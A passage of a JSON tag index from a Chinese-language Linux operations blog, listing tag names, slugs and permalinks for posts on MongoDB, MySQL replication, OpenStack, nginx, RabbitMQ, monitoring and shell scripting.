%9C%98%E8%9B%9B/"},{"name":"User Agent","slug":"User-Agent","permalink":"https://garywu520.github.io/tags/User-Agent/"},{"name":"垃圾UA","slug":"垃圾UA","permalink":"https://garywu520.github.io/tags/%E5%9E%83%E5%9C%BEUA/"},{"name":"Mongodb","slug":"Mongodb","permalink":"https://garywu520.github.io/tags/Mongodb/"},{"name":"mongod","slug":"mongod","permalink":"https://garywu520.github.io/tags/mongod/"},{"name":"二进制版","slug":"二进制版","permalink":"https://garywu520.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%89%88/"},{"name":"crontab","slug":"crontab","permalink":"https://garywu520.github.io/tags/crontab/"},{"name":"外部命令","slug":"外部命令","permalink":"https://garywu520.github.io/tags/%E5%A4%96%E9%83%A8%E5%91%BD%E4%BB%A4/"},{"name":"内部命令","slug":"内部命令","permalink":"https://garywu520.github.io/tags/%E5%86%85%E9%83%A8%E5%91%BD%E4%BB%A4/"},{"name":"STARTUP","slug":"STARTUP","permalink":"https://garywu520.github.io/tags/STARTUP/"},{"name":"副本集成员","slug":"副本集成员","permalink":"https://garywu520.github.io/tags/%E5%89%AF%E6%9C%AC%E9%9B%86%E6%88%90%E5%91%98/"},{"name":"成员状态","slug":"成员状态","permalink":"https://garywu520.github.io/tags/%E6%88%90%E5%91%98%E7%8A%B6%E6%80%81/"},{"name":"进程启动时间","slug":"进程启动时间","permalink":"https://garywu520.github.io/tags/%E8%BF%9B%E7%A8%8B%E5%90%AF%E5%8A%A8%E6%97%B6%E9%97%B4/"},{"name":"进程运行时间","slug":"进程运行时间","permalink":"https://garywu520.github.io/tags/%E8%BF%9B%E7%A8%8B%E8%BF%90%E8%A1%8C%E6%97%B6%E9%97%B4/"},{"name":"wget","slug":"wget","permalink":"https://garywu520.github.io/tags/wget/"},{"name":"curl请求url不使用缓存","slug":"curl请求url不使用缓存","permalink":"https://garywu520.github.io/tags/curl%E8%AF%B7%E6%B1%82url%E4%B8%8D%E4%BD%BF%E7%94%A8%E7%BC%93%E5%AD%98/"},{"name":"SOCKS5","slug":"SOCKS5","permalink":"https://garywu520.github.io/tags/SOCKS5/"},{"name":"proxychains","slug":"proxychains","permalink":"https://garywu520.github.io/tags/proxychains/"},{"name":"命令代理","slug":"命令代理","permalink":"https://garywu520.github.io/tags/%E5%91%BD%E4%BB%A4%E4%BB%A3%E7%90%86/"},{"name":"系统瓶颈","slug":"系统瓶颈","permalink":"https://garywu520.github.io/tags/%E7%B3%BB%E7%BB%9F%E7%93%B6%E9%A2%88/"},{"name":"sar","slug":"sar","permalink":"https://garywu520.github.io/tags/sar/"},{"name":"System Activity Reporter","slug":"System-Activity-Reporter","permalink":"https://garywu520.github.io/tags/System-Activity-Reporter/"},{"name":"系统活动情况报告","slug":"系统活动情况报告","permalink":"https://garywu520.github.io/tags/%E7%B3%BB%E7%BB%9F%E6%B4%BB%E5%8A%A8%E6%83%85%E5%86%B5%E6%8A%A5%E5%91%8A/"},{"name":"libsodium","slug":"libsodium","permalink":"https://garywu520.github.io/tags/libsodium/"},{"name":"AES-256-GCM","slug":"AES-256-GCM","permalink":"https://garywu520.github.io/tags/AES-256-GCM/"},{"name":"ChaCha20-Poly1305","slug":"ChaCha20-Poly1305","permalink":"https://garywu520.github.io/tags/ChaCha20-Poly1305/"},{"name":"XChaCha20-Poly1305","slug":"XChaCha20-Poly1305","permalink":"https://garywu520.github.io/tags/XChaCha20-Poly1305/"},{"name":"AEAD加密","slug":"AEAD加密","permalink":"https://garywu520.github.io/tags/AEAD%E5%8A%A0%E5%AF%86/"},{"name":"加密算法","slug":"加密算法","permalink":"https://garywu520.github.io/tags/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"},{"name":"小数判断","slug":"小数判断","permalink":"https://garywu520.github.io/tags/%E5%B0%8F%E6%95%B0%E5%88%A4%E6%96%AD/"},{"name":"if判断","slug":"if判断","permalink":"https://garywu520.github.io/tags/if%E5%88%A4%E6%96%AD/"},{"name":"浮点数判断","slug":"浮点数判断","permalink":"https://garywu520.github.io/tags/%E6%B5%AE%E7%82%B9%E6%95%B0%E5%88%A4%E6%96%AD/"},{"name":"cookie","slug":"cookie","permalink":"https://garywu520.github.io/tags/cookie/"},{"name":"response","slug":"response","permalink":"https://garywu520.github.io/tags/response/"},{"name":"模拟浏览器","slug":"模拟浏览器","permalink":"https://garywu520.github.io/tags/%E6%A8%A1%E6%8B%9F%E6%B5%8F%E8%A7%88%E5%99%A8/"},{"name":"伪造referer","slug":"伪造referer","permalink":"https://garywu520.github.io/tags/%E4%BC%AA%E9%80%A0referer/"},{"name":"mongodb","slug":"mongodb","permalink":"https://garywu520.github.io/tags/mongodb/"},{"name":"rs.slaveOk()","slug":"rs-slaveOk","permalink":"https://garywu520.github.io/tags/rs-slaveOk/"},{"name":"mongodb从库读操作","slug":"mongodb从库读操作","permalink":"https://garywu520.github.io/tags/mongodb%E4%BB%8E%E5%BA%93%E8%AF%BB%E6%93%8D%E4%BD%9C/"},{"name":"parted","slug":"parted","permalink":"https://garywu520.github.io/tags/parted/"},{"name":"fdisk","slug":"fdisk","permalink":"https://garywu520.github.io/tags/fdisk/"},{"name":"mongoexport","slug":"mongoexport","permalink":"https://garywu520.github.io/tags/mongoexport/"},{"name":"mongoimport","slug":"mongoimport","permalink":"https://garywu520.github.io/tags/mongoimport/"},{"name":"json","slug":"json","permalink":"https://garywu520.github.io/tags/json/"},{"name":"csv","slug":"csv","permalink":"https://garywu520.github.io/tags/csv/"},{"name":"mongo导出命令","slug":"mongo导出命令","permalink":"https://garywu520.github.io/tags/mongo%E5%AF%BC%E5%87%BA%E5%91%BD%E4%BB%A4/"},{"name":"cacti","slug":"cacti","permalink":"https://garywu520.github.io/tags/cacti/"},{"name":"rrdtool","slug":"rrdtool","permalink":"https://garywu520.github.io/tags/rrdtool/"},{"name":"fs","slug":"fs","permalink":"https://garywu520.github.io/tags/fs/"},{"name":"微信","slug":"微信","permalink":"https://garywu520.github.io/tags/%E5%BE%AE%E4%BF%A1/"},{"name":"微信告警","slug":"微信告警","permalink":"https://garywu520.github.io/tags/%E5%BE%AE%E4%BF%A1%E5%91%8A%E8%AD%A6/"},{"name":"CPU","slug":"CPU","permalink":"https://garywu520.github.io/tags/CPU/"},{"name":"使用率","slug":"使用率","permalink":"https://garywu520.github.io/tags/%E4%BD%BF%E7%94%A8%E7%8E%87/"},{"name":"499","slug":"499","permalink":"https://garywu520.github.io/tags/499/"},{"name":"nginx upstream","slug":"nginx-upstream","permalink":"https://garywu520.github.io/tags/nginx-upstream/"},{"name":"proxy_ignore_client_abort","slug":"proxy-ignore-client-abort","permalink":"https://garywu520.github.io/tags/proxy-ignore-client-abort/"},{"name":"限速方案","slug":"限速方案","permalink":"https://garywu520.github.io/tags/%E9%99%90%E9%80%9F%E6%96%B9%E6%A1%88/"},{"name":"Linux限速","slug":"Linux限速","permalink":"https://garywu520.github.io/tags/Linux%E9%99%90%E9%80%9F/"},{"name":"wondershaper","slug":"wondershaper","permalink":"https://garywu520.github.io/tags/wondershaper/"},{"name":"tc","slug":"tc","permalink":"https://garywu520.github.io/tags/tc/"},{"name":"ethtool","slug":"ethtool","permalink":"https://garywu520.github.io/tags/ethtool/"},{"name":"RouterOS","slug":"RouterOS","permalink":"https://garywu520.github.io/tags/RouterOS/"},{"name":"Ros","slug":"Ros","permalink":"https://garywu520.github.io/tags/Ros/"},{"name":"交互","slug":"交互","permalink":"https://garywu520.github.io/tags/%E4%BA%A4%E4%BA%92/"},{"name":"Route","slug":"Route","permalink":"https://garywu520.github.io/tags/Route/"},{"name":"静态路由","slug":"静态路由","permalink":"https://garywu520.github.io/tags/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/"},{"name":"默认路由","slug":"默认路由","permalink":"https://garywu520.github.io/tags/%E9%BB%98%E8%AE%A4%E8%B7%AF%E7%94%B1/"},{"name":"路由配置","slug":"路由配置","permalink":"https://garywu520.github.io/tags/%E8%B7%AF%E7%94%B1%E9%85%8D%E7%BD%AE/"},{"name":"proxy-set-header","slug":"proxy-set-header","permalink":"https://garywu520.github.io/tags/proxy-set-header/"},{"name":"Host","slug":"Host","permalink":"https://garywu520.github.io/tags/Host/"},{"name":"X-Forward-For","slug":"X-Forward-For","permalink":"https://garywu520.github.io/tags/X-Forward-For/"},{"name":"文件句柄","slug":"文件句柄","permalink":"https://garywu520.github.io/tags/%E6%96%87%E4%BB%B6%E5%8F%A5%E6%9F%84/"},{"name":"lsof","slug":"lsof","permalink":"https://garywu520.github.io/tags/lsof/"},{"name":"空间释放","slug":"空间释放","permalink":"https://garywu520.github.io/tags/%E7%A9%BA%E9%97%B4%E9%87%8A%E6%94%BE/"},{"name":"mysqldumpslow","slug":"mysqldumpslow","permalink":"https://garywu520.github.io/tags/mysqldumpslow/"},{"name":"HTTP状态码","slug":"HTTP状态码","permalink":"https://garywu520.github.io/tags/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/"},{"name":"302","slug":"302","permalink":"https://garywu520.github.io/tags/302/"},{"name":"upstream","slug":"upstream","permalink":"https://garywu520.github.io/tags/upstream/"},{"name":"TCP/IP","slug":"TCP-IP","permalink":"https://garywu520.github.io/tags/TCP-IP/"},{"name":"TIME_WAIT过多","slug":"TIME-WAIT过多","permalink":"https://garywu520.github.io/tags/TIME-WAIT%E8%BF%87%E5%A4%9A/"},{"name":"内核","slug":"内核","permalink":"https://garywu520.github.io/tags/%E5%86%85%E6%A0%B8/"},{"name":"net.ipv4","slug":"net-ipv4","permalink":"https://garywu520.github.io/tags/net-ipv4/"},{"name":"openstack","slug":"openstack","permalink":"https://garywu520.github.io/tags/openstack/"},{"name":"本地yum","slug":"本地yum","permalink":"https://garywu520.github.io/tags/%E6%9C%AC%E5%9C%B0yum/"},{"name":"mysql slave","slug":"mysql-slave","permalink":"https://garywu520.github.io/tags/mysql-slave/"},{"name":"relay log","slug":"relay-log","permalink":"https://garywu520.github.io/tags/relay-log/"},{"name":"可用域","slug":"可用域","permalink":"https://garywu520.github.io/tags/%E5%8F%AF%E7%94%A8%E5%9F%9F/"},{"name":"availablitiy_zone","slug":"availablitiy-zone","permalink":"https://garywu520.github.io/tags/availablitiy-zone/"},{"name":"aggregate host","slug":"aggregate-host","permalink":"https://garywu520.github.io/tags/aggregate-host/"},{"name":"nova schedule","slug":"nova-schedule","permalink":"https://garywu520.github.io/tags/nova-schedule/"},{"name":"az","slug":"az","permalink":"https://garywu520.github.io/tags/az/"},{"name":"IaaS","slug":"IaaS","permalink":"https://garywu520.github.io/tags/IaaS/"},{"name":"PaaS","slug":"PaaS","permalink":"https://garywu520.github.io/tags/PaaS/"},{"name":"SaaS","slug":"SaaS","permalink":"https://garywu520.github.io/tags/SaaS/"},{"name":"自重启","slug":"自重启","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E9%87%8D%E5%90%AF/"},{"name":"磁盘坏道","slug":"磁盘坏道","permalink":"https://garywu520.github.io/tags/%E7%A3%81%E7%9B%98%E5%9D%8F%E9%81%93/"},{"name":"编译nginx","slug":"编译nginx","permalink":"https://garywu520.github.io/tags/%E7%BC%96%E8%AF%91nginx/"},{"name":"MongoDB集群","slug":"MongoDB集群","permalink":"https://garywu520.github.io/tags/MongoDB%E9%9B%86%E7%BE%A4/"},{"name":"mongo集群管理维护","slug":"mongo集群管理维护","permalink":"https://garywu520.github.io/tags/mongo%E9%9B%86%E7%BE%A4%E7%AE%A1%E7%90%86%E7%BB%B4%E6%8A%A4/"},{"name":"nova","slug":"nova","permalink":"https://garywu520.github.io/tags/nova/"},{"name":"libvert","slug":"libvert","permalink":"https://garywu520.github.io/tags/libvert/"},{"name":"热迁移 live migration","slug":"热迁移-live-migration","permalink":"https://garywu520.github.io/tags/%E7%83%AD%E8%BF%81%E7%A7%BB-live-migration/"},{"name":"动态迁移","slug":"动态迁移","permalink":"https://garywu520.github.io/tags/%E5%8A%A8%E6%80%81%E8%BF%81%E7%A7%BB/"},{"name":"主机聚合 Host Aggregates","slug":"主机聚合-Host-Aggregates","permalink":"https://garywu520.github.io/tags/%E4%B8%BB%E6%9C%BA%E8%81%9A%E5%90%88-Host-Aggregates/"},{"name":"可用域 Availability Zones","slug":"可用域-Availability-Zones","permalink":"https://garywu520.github.io/tags/%E5%8F%AF%E7%94%A8%E5%9F%9F-Availability-Zones/"},{"name":"schedule","slug":"schedule","permalink":"https://garywu520.github.io/tags/schedule/"},{"name":"autostart","slug":"autostart","permalink":"https://garywu520.github.io/tags/autostart/"},{"name":"neutron","slug":"neutron","permalink":"https://garywu520.github.io/tags/neutron/"},{"name":"static IP","slug":"static-IP","permalink":"https://garywu520.github.io/tags/static-IP/"},{"name":"静态IP","slug":"静态IP","permalink":"https://garywu520.github.io/tags/%E9%9D%99%E6%80%81IP/"},{"name":"port-update","slug":"port-update","permalink":"https://garywu520.github.io/tags/port-update/"},{"name":"Bind","slug":"Bind","permalink":"https://garywu520.github.io/tags/Bind/"},{"name":"Unbound","slug":"Unbound","permalink":"https://garywu520.github.io/tags/Unbound/"},{"name":"ACCEPT","slug":"ACCEPT","permalink":"https://garywu520.github.io/tags/ACCEPT/"},{"name":"DROP","slug":"DROP","permalink":"https://garywu520.github.io/tags/DROP/"},{"name":"ROS","slug":"ROS","permalink":"https://garywu520.github.io/tags/ROS/"},{"name":"NTP时间同步","slug":"NTP时间同步","permalink":"https://garywu520.github.io/tags/NTP%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5/"},{"name":"证书导入","slug":"证书导入","permalink":"https://garywu520.github.io/tags/%E8%AF%81%E4%B9%A6%E5%AF%BC%E5%85%A5/"},{"name":"证书信任","slug":"证书信任","permalink":"https://garywu520.github.io/tags/%E8%AF%81%E4%B9%A6%E4%BF%A1%E4%BB%BB/"},{"name":"自签名证书","slug":"自签名证书","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6/"},{"name":"Kernel","slug":"Kernel","permalink":"https://garywu520.github.io/tags/Kernel/"},{"name":"ACPI Error","slug":"ACPI-Error","permalink":"https://garywu520.github.io/tags/ACPI-Error/"},{"name":"no hander","slug":"no-hander","permalink":"https://garywu520.github.io/tags/no-hander/"},{"name":"1236","slug":"1236","permalink":"https://garywu520.github.io/tags/1236/"},{"name":"主从复制错误","slug":"主从复制错误","permalink":"https://garywu520.github.io/tags/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E9%94%99%E8%AF%AF/"},{"name":"Gentoo","slug":"Gentoo","permalink":"https://garywu520.github.io/tags/Gentoo/"},{"name":"内核编译","slug":"内核编译","permalink":"https://garywu520.github.io/tags/%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/"},{"name":"Mongo","slug":"Mongo","permalink":"https://garywu520.github.io/tags/Mongo/"},{"name":"用户管理","slug":"用户管理","permalink":"https://garywu520.github.io/tags/%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86/"},{"name":"授权管理","slug":"授权管理","permalink":"https://garywu520.github.io/tags/%E6%8E%88%E6%9D%83%E7%AE%A1%E7%90%86/"},{"name":"数据库管理","slug":"数据库管理","permalink":"https://garywu520.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86/"},{"name":"高可用","slug":"高可用","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E5%8F%AF%E7%94%A8/"},{"name":"路由","slug":"路由","permalink":"https://garywu520.github.io/tags/%E8%B7%AF%E7%94%B1/"},{"name":"分片","slug":"分片","permalink":"https://garywu520.github.io/tags/%E5%88%86%E7%89%87/"},{"name":"副本集","slug":"副本集","permalink":"https://garywu520.github.io/tags/%E5%89%AF%E6%9C%AC%E9%9B%86/"},{"name":"rc.local","slug":"rc-local","permalink":"https://garywu520.github.io/tags/rc-local/"},{"name":"local.d","slug":"local-d","permalink":"https://garywu520.github.io/tags/local-d/"},{"name":"rc-update","slug":"rc-update","permalink":"https://garywu520.github.io/tags/rc-update/"},{"name":"自启动","slug":"自启动","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%90%AF%E5%8A%A8/"},{"name":"开机自启动","slug":"开机自启动","permalink":"https://garywu520.github.io/tags/%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8/"},{"name":"服务自启","slug":"服务自启","permalink":"https://garywu520.github.io/tags/%E6%9C%8D%E5%8A%A1%E8%87%AA%E5%90%AF/"},{"name":"expr","slug":"expr","permalink":"https://garywu520.github.io/tags/expr/"},{"name":"变量自增","slug":"变量自增","permalink":"https://garywu520.github.io/tags/%E5%8F%98%E9%87%8F%E8%87%AA%E5%A2%9E/"},{"name":"shell基础","slug":"shell基础","permalink":"https://garywu520.github.io/tags/shell%E5%9F%BA%E7%A1%80/"},{"name":"Xtrabackup","slug":"Xtrabackup","permalink":"https://garywu520.github.io/tags/Xtrabackup/"},{"name":"innobackupex","slug":"innobackupex","permalink":"https://garywu520.github.io/tags/innobackupex/"},{"name":"新增从库","slug":"新增从库","permalink":"https://garywu520.github.io/tags/%E6%96%B0%E5%A2%9E%E4%BB%8E%E5%BA%93/"},{"name":"2002","slug":"2002","permalink":"https://garywu520.github.io/tags/2002/"},{"name":"1062","slug":"1062","permalink":"https://garywu520.github.io/tags/1062/"},{"name":"FTP","slug":"FTP","permalink":"https://garywu520.github.io/tags/FTP/"},{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"Funtoo","slug":"Funtoo","permalink":"https://garywu520.github.io/tags/Funtoo/"},{"name":"USE标记","slug":"USE标记","permalink":"https://garywu520.github.io/tags/USE%E6%A0%87%E8%AE%B0/"},{"name":"emerge命令","slug":"emerge命令","permalink":"https://garywu520.github.io/tags/emerge%E5%91%BD%E4%BB%A4/"},{"name":"Failover","slug":"Failover","permalink":"https://garywu520.github.io/tags/Failover/"},{"name":"binlog server","slug":"binlog-server","permalink":"https://garywu520.github.io/tags/binlog-server/"},{"name":"异步复制","slug":"异步复制","permalink":"https://garywu520.github.io/tags/%E5%BC%82%E6%AD%A5%E5%A4%8D%E5%88%B6/"},{"name":"半同步复制","slug":"半同步复制","permalink":"https://garywu520.github.io/tags/%E5%8D%8A%E5%90%8C%E6%AD%A5%E5%A4%8D%E5%88%B6/"},{"name":"MHA","slug":"MHA","permalink":"https://garywu520.github.io/tags/MHA/"},{"name":"VIP","slug":"VIP","permalink":"https://garywu520.github.io/tags/VIP/"},{"name":"主从复制监控","slug":"主从复制监控","permalink":"https://garywu520.github.io/tags/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9B%91%E6%8E%A7/"},{"name":"MySQL主从复制","slug":"MySQL主从复制","permalink":"https://garywu520.github.io/tags/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"name":"全备还原","slug":"全备还原","permalink":"https://garywu520.github.io/tags/%E5%85%A8%E5%A4%87%E8%BF%98%E5%8E%9F/"},{"name":"iDRAC6","slug":"iDRAC6","permalink":"https://garywu520.github.io/tags/iDRAC6/"},{"name":"远控卡","slug":"远控卡","permalink":"https://garywu520.github.io/tags/%E8%BF%9C%E6%8E%A7%E5%8D%A1/"},{"name":"RAID","slug":"RAID","permalink":"https://garywu520.github.io/tags/RAID/"},{"name":"RAID控制卡","slug":"RAID控制卡","permalink":"https://garywu520.github.io/tags/RAID%E6%8E%A7%E5%88%B6%E5%8D%A1/"},{"name":"mongodump","slug":"mongodump","permalink":"https://garywu520.github.io/tags/mongodump/"},{"name":"mongorestore","slug":"mongorestore","permalink":"https://garywu520.github.io/tags/mongorestore/"},{"name":"ntp","slug":"ntp","permalink":"https://garywu520.github.io/tags/ntp/"},{"name":"chrony","slug":"chrony","permalink":"https://garywu520.github.io/tags/chrony/"},{"name":"时间同步","slug":"时间同步","permalink":"https://garywu520.github.io/tags/%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5/"},{"name":"zip","slug":"zip","permalink":"https://garywu520.github.io/tags/zip/"},{"name":"xz","slug":"xz","permalink":"https://garywu520.github.io/tags/xz/"},{"name":"gzip","slug":"gzip","permalink":"https://garywu520.github.io/tags/gzip/"},{"name":"压缩","slug":"压缩","permalink":"https://garywu520.github.io/tags/%E5%8E%8B%E7%BC%A9/"},{"name":"shell编程","slug":"shell编程","permalink":"https://garywu520.github.io/tags/shell%E7%BC%96%E7%A8%8B/"},{"name":"flock","slug":"flock","permalink":"https://garywu520.github.io/tags/flock/"},{"name":"php-fpm","slug":"php-fpm","permalink":"https://garywu520.github.io/tags/php-fpm/"},{"name":"php优化","slug":"php优化","permalink":"https://garywu520.github.io/tags/php%E4%BC%98%E5%8C%96/"},{"name":"Google Authenticator","slug":"Google-Authenticator","permalink":"https://garywu520.github.io/tags/Google-Authenticator/"},{"name":"高级优化","slug":"高级优化","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E4%BC%98%E5%8C%96/"},{"name":"CPU超配","slug":"CPU超配","permalink":"https://garywu520.github.io/tags/CPU%E8%B6%85%E9%85%8D/"},{"name":"neutron防火墙","slug":"neutron防火墙","permalink":"https://garywu520.github.io/tags/neutron%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"Glance","slug":"Glance","permalink":"https://garywu520.github.io/tags/Glance/"},{"name":"qcow2","slug":"qcow2","permalink":"https://garywu520.github.io/tags/qcow2/"},{"name":"制作镜像","slug":"制作镜像","permalink":"https://garywu520.github.io/tags/%E5%88%B6%E4%BD%9C%E9%95%9C%E5%83%8F/"},{"name":"80","slug":"80","permalink":"https://garywu520.github.io/tags/80/"},{"name":"443","slug":"443","permalink":"https://garywu520.github.io/tags/443/"},{"name":"OpenStack","slug":"OpenStack","permalink":"https://garywu520.github.io/tags/OpenStack/"},{"name":"云主机","slug":"云主机","permalink":"https://garywu520.github.io/tags/%E4%BA%91%E4%B8%BB%E6%9C%BA/"},{"name":"元数据","slug":"元数据","permalink":"https://garywu520.github.io/tags/%E5%85%83%E6%95%B0%E6%8D%AE/"},{"name":"metadata","slug":"metadata","permalink":"https://garywu520.github.io/tags/metadata/"},{"name":"Horizon","slug":"Horizon","permalink":"https://garywu520.github.io/tags/Horizon/"},{"name":"Dashboard","slug":"Dashboard","permalink":"https://garywu520.github.io/tags/Dashboard/"},{"name":"创建云主机","slug":"创建云主机","permalink":"https://garywu520.github.io/tags/%E5%88%9B%E5%BB%BA%E4%BA%91%E4%B8%BB%E6%9C%BA/"},{"name":"HTTP代理","slug":"HTTP代理","permalink":"https://garywu520.github.io/tags/HTTP%E4%BB%A3%E7%90%86/"},{"name":"Shell脚本","slug":"Shell脚本","permalink":"https://garywu520.github.io/tags/Shell%E8%84%9A%E6%9C%AC/"},{"name":"Neutron","slug":"Neutron","permalink":"https://garywu520.github.io/tags/Neutron/"},{"name":"服务端口号汇总","slug":"服务端口号汇总","permalink":"https://garywu520.github.io/tags/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3%E5%8F%B7%E6%B1%87%E6%80%BB/"},{"name":"MySQL主从库同步错误","slug":"MySQL主从库同步错误","permalink":"https://garywu520.github.io/tags/MySQL%E4%B8%BB%E4%BB%8E%E5%BA%93%E5%90%8C%E6%AD%A5%E9%94%99%E8%AF%AF/"},{"name":"Nova","slug":"Nova","permalink":"https://garywu520.github.io/tags/Nova/"},{"name":"rabbitmq","slug":"rabbitmq","permalink":"https://garywu520.github.io/tags/rabbitmq/"},{"name":"rabbitmq集群","slug":"rabbitmq集群","permalink":"https://garywu520.github.io/tags/rabbitmq%E9%9B%86%E7%BE%A4/"},{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"https://garywu520.github.io/tags/RabbitMQ/"},{"name":"Erlang","slug":"Erlang","permalink":"https://garywu520.github.io/tags/Erlang/"},{"name":"消息队列","slug":"消息队列","permalink":"https://garywu520.github.io/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"},{"name":"RabbitMQ集群部署","slug":"RabbitMQ集群部署","permalink":"https://garywu520.github.io/tags/RabbitMQ%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/"},{"name":"Keystone","slug":"Keystone","permalink":"https://garywu520.github.io/tags/Keystone/"},{"name":"LVS","slug":"LVS","permalink":"https://garywu520.github.io/tags/LVS/"},{"name":"LVS连接数监控","slug":"LVS连接数监控","permalink":"https://garywu520.github.io/tags/LVS%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%91%E6%8E%A7/"},{"name":"ipvsadm","slug":"ipvsadm","permalink":"https://garywu520.github.io/tags/ipvsadm/"},{"name":"ActiveConn","slug":"ActiveConn","permalink":"https://garywu520.github.io/tags/ActiveConn/"},{"name":"InActConn","slug":"InActConn","permalink":"https://garywu520.github.io/tags/InActConn/"},{"name":"web监控","slug":"web监控","permalink":"https://garywu520.github.io/tags/web%E7%9B%91%E6%8E%A7/"},{"name":"URL监控","slug":"URL监控","permalink":"https://garywu520.github.io/tags/URL%E7%9B%91%E6%8E%A7/"},{"name":"uri","slug":"uri","permalink":"https://garywu520.github.io/tags/uri/"},{"name":"屏蔽接口","slug":"屏蔽接口","permalink":"https://garywu520.github.io/tags/%E5%B1%8F%E8%94%BD%E6%8E%A5%E5%8F%A3/"},{"name":"log","slug":"log","permalink":"https://garywu520.github.io/tags/log/"},{"name":"tail","slug":"tail","permalink":"https://garywu520.github.io/tags/tail/"},{"name":"tailf","slug":"tailf","permalink":"https://garywu520.github.io/tags/tailf/"},{"name":"日志统计","slug":"日志统计","permalink":"https://garywu520.github.io/tags/%E6%97%A5%E5%BF%97%E7%BB%9F%E8%AE%A1/"},{"name":"云计算","slug":"云计算","permalink":"https://garywu520.github.io/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"},{"name":"virsh","slug":"virsh","permalink":"https://garywu520.github.io/tags/virsh/"},{"name":"oVirt","slug":"oVirt","permalink":"https://garywu520.github.io/tags/oVirt/"},{"name":"KVM虚拟化","slug":"KVM虚拟化","permalink":"https://garywu520.github.io/tags/KVM%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"dba","slug":"dba","permalink":"https://garywu520.github.io/tags/dba/"},{"name":"PerconaDB","slug":"PerconaDB","permalink":"https://garywu520.github.io/tags/PerconaDB/"},{"name":"Oracle","slug":"Oracle","permalink":"https://garywu520.github.io/tags/Oracle/"},{"name":"MySQL多实例","slug":"MySQL多实例","permalink":"https://garywu520.github.io/tags/MySQL%E5%A4%9A%E5%AE%9E%E4%BE%8B/"},{"name":"MySQL多实例远程登陆","slug":"MySQL多实例远程登陆","permalink":"https://garywu520.github.io/tags/MySQL%E5%A4%9A%E5%AE%9E%E4%BE%8B%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86/"},{"name":"producer","slug":"producer","permalink":"https://garywu520.github.io/tags/producer/"},{"name":"MQ","slug":"MQ","permalink":"https://garywu520.github.io/tags/MQ/"},{"name":"RbbitMQ","slug":"RbbitMQ","permalink":"https://garywu520.github.io/tags/RbbitMQ/"},{"name":"kibana","slug":"kibana","permalink":"https://garywu520.github.io/tags/kibana/"},{"name":"output","slug":"output","permalink":"https://garywu520.github.io/tags/output/"},{"name":"codec","slug":"codec","permalink":"https://garywu520.github.io/tags/codec/"},{"name":"rubydebug","slug":"rubydebug","permalink":"https://garywu520.github.io/tags/rubydebug/"},{"name":"Gitlab","slug":"Gitlab","permalink":"https://garywu520.github.io/tags/Gitlab/"},{"name":"Git","slug":"Git","permalink":"https://garywu520.github.io/tags/Git/"},{"name":"svn","slug":"svn","permalink":"https://garywu520.github.io/tags/svn/"},{"name":"版本控制","slug":"版本控制","permalink":"https://garywu520.github.io/tags/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/"},{"name":"Logstash","slug":"Logstash","permalink":"https://garywu520.github.io/tags/Logstash/"},{"name":"Tomcat","slug":"Tomcat","permalink":"https://garywu520.github.io/tags/Tomcat/"},{"name":"Java","slug":"Java","permalink":"https://garywu520.github.io/tags/Java/"},{"name":"kopf","slug":"kopf","permalink":"https://garywu520.github.io/tags/kopf/"},{"name":"ELK安全设置","slug":"ELK安全设置","permalink":"https://garywu520.github.io/tags/ELK%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/"},{"name":"elasticsearch集群监控","slug":"elasticsearch集群监控","permalink":"https://garywu520.github.io/tags/elasticsearch%E9%9B%86%E7%BE%A4%E7%9B%91%E6%8E%A7/"},{"name":"DDos","slug":"DDos","permalink":"https://garywu520.github.io/tags/DDos/"},{"name":"shell DDos","slug":"shell-DDos","permalink":"https://garywu520.github.io/tags/shell-DDos/"},{"name":"break","slug":"break","permalink":"https://garywu520.github.io/tags/break/"},{"name":"continue","slug":"continue","permalink":"https://garywu520.github.io/tags/continue/"},{"name":"exit","slug":"exit","permalink":"https://garywu520.github.io/tags/exit/"},{"name":"return","slug":"return","permalink":"https://garywu520.github.io/tags/return/"},{"name":"持续集成","slug":"持续集成","permalink":"https://garywu520.github.io/tags/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"name":"持续交付","slug":"持续交付","permalink":"https://garywu520.github.io/tags/%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98/"},{"name":"jenkins","slug":"jenkins","permalink":"https://garywu520.github.io/tags/jenkins/"},{"name":"自动构建","slug":"自动构建","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%8A%A8%E6%9E%84%E5%BB%BA/"},{"name":"Git服务器","slug":"Git服务器","permalink":"https://garywu520.github.io/tags/Git%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"CentOS7","slug":"CentOS7","permalink":"https://garywu520.github.io/tags/